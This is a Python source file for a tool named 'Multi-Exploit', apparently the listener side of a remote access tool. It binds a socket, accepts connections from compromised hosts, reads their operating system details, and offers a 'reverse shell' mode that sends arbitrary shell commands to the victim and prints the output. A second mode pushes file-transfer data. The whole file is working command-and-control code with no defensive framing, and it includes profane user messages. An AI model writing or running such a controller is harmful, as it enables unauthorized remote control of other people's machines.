#    Multi-Exploit  Copyright (C) 2024  Adam Perkowski

import socket
from time import sleep
import os
from sys import argv

broken = False

if os.name == 'posix':
    clrs = 'clear'
elif os.name == 'nt':
    clrs = "cls && echo 'why windows?' && echo"
else:
    clrs = ''

argv.pop(0)
print(argv)

os.system(clrs)

print(''' __  __       _ _   _       _____            _       _ _   
|  \/  |_   _| | |_(_)     | ____|_  ___ __ | | ___ (_) |_ 
| |\/| | | | | | __| |_____|  _| \ \/ / '_ \| |/ _ \| | __|
| |  | | |_| | | |_| |_____| |___ >  <| |_) | | (_) | | |_ 
|_|  |_|\__,_|_|\__|_|     |_____/_/\_\ .__/|_|\___/|_|\__|
                                      |_|                  
''')
print("Copyright (C) 2024  Adam Perkowski\nhttps://github.com/adamperkowski\nhttps://www.reddit.com/user/xPedalitto\n\nOfficial repo: https://github.com/adamperkowski/file-transfer-exploit\nLicense: https://github.com/adamperkowski/multi-exploit/blob/main/LICENSE\n\n\n")

dec = ["  \033[33m[ ? ]\033[0m ", "\033[33m?\033[0m  ", "  \033[34m[ * ]\033[0m ", "  \033[31m[ ! ]\033[0m ", "  \033[32m[ * ]\033[0m ", "  \033[33m>> $ \033[0m  "]
def fo():
    print("\n\033[31mFUCK OFF  FUCK OFF  FUCK OFF  FUCK OFF\033[0m\n")
    sleep(1)
    exit()

if len(argv) > 0:
    if argv[0] == "--help":
        print('''Usage blah blah blah''')
        exit()

if os.getuid() != 0:
    print(f'\n{dec[3]} Please... pleeeaaaase im begging you... please run this with root privileges!')
    fo()

sockObject = socket.socket()

try:
    if len(argv) < 2:
        hostIP = input(f'{dec[0]} Host (listener) IP address {dec[1]}')
        port = int(input(f'{dec[0]} Listener port   {dec[1]}'))
    else:
        hostIP = argv[0]
        port = int(argv[1])

except:
    print(f'\n{dec[3]} U dumb or sum?')
    fo()

try:
    sockObject.bind((hostIP, port))
    sockObject.listen()

except Exception as e: 
    print(f'\n{dec[3]} There was a problem (you) :(')
    print(e)
    fo()

while True:
    print(f'\n{dec[2]} Listening on {hostIP}:{port}')
    connected = sockObject.accept()
    
    # os.system(clrs)

    print(f'\n{dec[4]} Connection estabilished with {connected[1][0]}')
    print(f'{dec[2]} Ping: \n')

    print(f'{dec[2]} OS: {connected[0].recv(1024).decode().upper()}')
    print(f'{dec[2]} {connected[0].recv(1024).decode()}\n')

    while True:
        mode = input(f'{dec[0]} Mode  {dec[1]}(\033[90mhelp\033[0m for list)  ')
        
        try:
            connected[0].send("ping".encode())
        except:
            print(f'\n{dec[3]} We lost him... But dont worry! If it was a connection issue, the host should reset!')
            broken = False
            break

        if 'help' in mode:
            print()

        elif 'clear' in mode:
            os.system(clrs)
            print()

        elif mode == '1' : # shell
            print(f'{dec[2]} Selected reverse shell (\033[90m0qq\033[0m to quit)')
            while True:
                message = input(dec[5])
                if '0qq' in message: break
                message = f"sh{message}".encode()
                try:
                    connected[0].send(message)
                    rec = connected[0].recv(1024).decode()

                    inpt = input('wait for ouput ? [Y/n] ')
                    if inpt.lower() == 'y' or inpt.lower() == '':
                        connected[0].send('wait'.encode())
                        while rec[0] == "p" and rec[1] == "o" and rec[2] == "n" and rec[3] == "g":
                            try:
                                rec = connected[0].recv(1024).decode()
                            except KeyboardInterrupt:
                                print(f"\n{dec[2]} Skipping waiting for output")
                                rec = ''
                                break
                        print(rec)
                    else:
                        print(f'{dec[2]} Sent.')
                        connected[0].send('go'.encode())
                except:
                    broken = True
                    break

        elif mode == '2':
            while True:
                message = input()
                if '00' in message: break
                message = f"ft{message}".encode()
                connected[0].send(message)

        if broken:
            print(f'\n{dec[3]} Connection interrupted :(')
            broken = False
            break
